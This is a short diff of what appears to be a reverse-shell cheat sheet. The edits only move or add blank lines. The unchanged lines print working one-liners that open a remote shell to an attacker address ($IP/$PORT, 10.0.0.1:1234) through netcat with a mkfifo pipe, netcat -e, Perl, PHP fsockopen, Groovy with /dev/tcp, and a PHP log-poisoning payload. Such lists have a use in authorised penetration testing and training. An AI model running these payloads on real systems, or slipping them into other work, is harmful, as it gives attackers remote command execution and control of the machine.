@@ -6,8 +6,8 @@ Netcat without -e
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 ```
-Netcat with -e
 
+Netcat with -e
 ```bash
 nc -e /bin/sh 10.0.0.1 1234
 ```
@@ -46,6 +46,7 @@ perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobynam
 php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+
 ## Log Poisoning PHP
 ```php
 <?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f') ?>
@@ -64,3 +65,4 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+
